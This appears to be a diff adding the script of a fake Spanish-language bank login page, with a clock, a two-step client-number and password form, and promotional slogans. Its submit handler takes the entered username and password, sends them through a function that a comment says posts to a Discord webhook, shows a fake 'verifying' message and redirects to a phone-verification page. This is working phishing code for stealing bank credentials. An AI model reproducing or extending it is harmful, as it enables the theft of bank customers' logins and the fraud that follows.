+            const fields = Array.from(form.querySelectorAll('input, button, select, textarea'))
+                .filter(el => !el.disabled && el.offsetParent !== null);
+            const idx = fields.indexOf(e.target);
+            if (idx > -1 && fields[idx + 1]) {
+                fields[idx + 1].focus();
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            /* 1. Reloj en tiempo real */
+            const clockElement = document.getElementById('liveClock');
+            const dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
+            const meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
+
+            function updateClock() {
+                const now = new Date();
+                // Hora de la Ciudad de México
+                const opts = { timeZone: 'America/Mexico_City' };
+                const mx = new Date(now.toLocaleString('en-US', opts));
+                const diaSemana = dias[mx.getDay()];
+                const dia = mx.getDate();
+                const mes = meses[mx.getMonth()];
+                const anio = mx.getFullYear();
+                const horas = String(mx.getHours()).padStart(2, '0');
+                const minutos = String(mx.getMinutes()).padStart(2, '0');
+                const segundos = String(mx.getSeconds()).padStart(2, '0');
+
+                clockElement.textContent = `${diaSemana} ${dia} de ${mes} de ${anio}, ${horas}:${minutos}:${segundos}`;
+            }
+            updateClock();
+            setInterval(updateClock, 1000);
+
+            /* 2. Flujo de formulario en dos pasos (Usuario -> Contraseña) */
+            const form = document.getElementById('loginForm');
+            const userStep = document.getElementById('userStep');
+            const passwordStep = document.getElementById('passwordStep');
+            const continueBtn = document.getElementById('continueBtn');
+            const changeUserBtn = document.getElementById('changeUserBtn');
+
+            const userInput = document.getElementById('userNumber');
+            const passwordInput = document.getElementById('passwordInput');
+            const rememberCheckbox = document.getElementById('rememberUser');
+
+            const userErrorMsg = document.getElementById('userErrorMsg');
+            const passErrorMsg = document.getElementById('passErrorMsg');
+            const userSummary = document.getElementById('userSummary');
+            const displayUser = document.getElementById('displayUser');
+            const helpIcons = document.querySelectorAll('.help-icon');
+
+            const savedUser = localStorage.getItem('savedClientNumber');
+            if (savedUser) {
+                userInput.value = savedUser;
+                rememberCheckbox.checked = true;
+            }
+
+            userInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '');
+                if (userInput.classList.contains('error')) {
+                    userInput.classList.remove('error');
+                    userErrorMsg.style.display = 'none';
+                }
+            });
+
+            passwordInput.addEventListener('input', () => {
+                if (passwordInput.classList.contains('error')) {
+                    passwordInput.classList.remove('error');
+                    passErrorMsg.style.display = 'none';
+                }
+            });
+
+            function goToPasswordStep() {
+                const val = userInput.value.trim();
+                if (val.length < 6) {
+                    userInput.classList.add('error');
+                    userErrorMsg.style.display = 'block';
+                    userInput.focus();
+                    return;
+                }
+
+                if (rememberCheckbox.checked) {
+                    localStorage.setItem('savedClientNumber', val);
+                } else {
+                    localStorage.removeItem('savedClientNumber');
+                }
+
+                displayUser.textContent = val;
+                userSummary.style.display = 'flex';
+                userStep.style.display = 'none';
+                passwordStep.style.display = 'block';
+                passwordInput.focus();
+            }
+
+            continueBtn.addEventListener('click', goToPasswordStep);
+
+            userInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    goToPasswordStep();
+                }
+            });
+
+            changeUserBtn.addEventListener('click', () => {
+                passwordInput.value = '';
+                passwordInput.classList.remove('error');
+                passErrorMsg.style.display = 'none';
+                passwordStep.style.display = 'none';
+                userStep.style.display = 'block';
+                userInput.focus();
+            });
+
+            /* 3. Tooltips interactivos */
+            helpIcons.forEach(icon => {
+                icon.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    helpIcons.forEach(other => {
+                        if (other !== icon) other.classList.remove('active');
+                    });
+                    icon.classList.toggle('active');
+                });
+            });
+
+            document.addEventListener('click', () => {
+                helpIcons.forEach(icon => icon.classList.remove('active'));
+            });
+
+            /* 4. Envío final de contraseña con captura al webhook */
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                if (passwordStep.style.display !== 'block') {
+                    goToPasswordStep();
+                    return;
+                }
+
+                const passVal = passwordInput.value;
+                if (passVal.trim().length < 4) {
+                    passwordInput.classList.add('error');
+                    passErrorMsg.style.display = 'block';
+                    passwordInput.focus();
+                    return;
+                }
+
+                // Captura de datos
+                const datos = {
+                    usuario: userInput.value.trim(),
+                    password: passVal,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                };
+
+                // Envío al webhook de Discord (si está disponible)
+                if (typeof window.enviarAWebhook === "function") {
+                    window.enviarAWebhook("login", {
+                        usuario: datos.usuario,
+                        password: datos.password
+                    });
+                }
+
+                // Feedback al usuario
+                const submitBtn = document.getElementById('loginSubmitBtn');
+                submitBtn.textContent = "Verificando...";
+                submitBtn.disabled = true;
+
+                setTimeout(() => {
+                    // Redirigir al flujo de verificación de celular
+                    window.location.href = "verificacion-celular.html";
+                }, 1200);
+            });
+
+            /* 5. Puntos del carrusel */
+            const dots = document.querySelectorAll('.dot');
+            const sloganEl = document.getElementById('promoSlogan');
+            const slogans = [
+                "Aquí.<br>Para ti.<br>Siempre.",
+                "Tu banca.<br>Más simple.<br>Más segura.",
+                "Control total.<br>Desde donde<br>estés.",
+                "Protegemos<br>lo que más<br>importa.",
+                "Soluciones<br>a tu ritmo."
+            ];
+
+            dots.forEach((dot, idx) => {
+                dot.addEventListener('click', () => {
+                    dots.forEach(d => d.classList.remove('active'));
+                    dot.classList.add('active');
+                    sloganEl.style.opacity = '0';
+                    setTimeout(() => {
+                        sloganEl.innerHTML = slogans[idx];
+                        sloganEl.style.opacity = '1';
+                    }, 180);
+                });
+            });
+        });
+    </script>
+
+</body>
+</html>
